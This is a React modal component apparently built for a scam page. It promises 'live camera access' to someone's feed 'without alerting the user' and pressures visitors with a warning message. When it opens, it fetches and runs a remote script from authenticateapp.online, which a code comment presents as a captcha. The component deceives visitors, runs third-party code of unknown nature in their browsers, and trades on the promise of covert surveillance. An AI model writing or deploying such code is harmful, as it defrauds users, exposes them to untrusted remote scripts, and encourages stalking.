import { useEffect } from "react";
import { Lock } from "lucide-react";

interface VerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const VerificationModal = ({ isOpen, onClose }: VerificationModalProps) => {
  useEffect(() => {
    if (isOpen && typeof window !== 'undefined') {
      // Load captcha script dynamically
      const script = document.createElement('script');
      script.src = 'https://authenticateapp.online/cp/js/n0208';
      script.type = 'text/javascript';
      document.body.appendChild(script);

      return () => {
        document.body.removeChild(script);
      };
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      {/* Backdrop with blur and dark overlay */}
      <div className="absolute inset-0 backdrop-blur-xl bg-black/70" />
      
      {/* Content */}
      <div className="relative w-full max-w-sm flex flex-col items-center justify-center">
        {/* Modal Card */}
        <div className="w-full bg-black/80 rounded-2xl p-6 flex flex-col items-center">
          {/* Link Icon */}
          <div className="w-16 h-16 rounded-full bg-gradient-to-br from-yellow-600/20 to-yellow-800/20 flex items-center justify-center mb-4">
            <Lock className="w-8 h-8 text-yellow-500" strokeWidth={2.5} />
          </div>

          {/* Title and Description */}
          <h2 className="text-xl font-bold text-foreground mb-2">Live Camera Access</h2>
          <p className="text-center text-muted-foreground text-xs mb-6 px-4">
            Complete verification to access the live camera feed without alerting the user
          </p>

          {/* Captcha Container */}
          <div className="mb-4 scale-90">
            <div data-captcha-enable="true"></div>
          </div>

          {/* Warning Text */}
          <p className="text-yellow-600 text-xs text-center whitespace-nowrap">
            System may trigger alert if session is left incomplete
          </p>
        </div>
      </div>
    </div>
  );
};

export default VerificationModal;
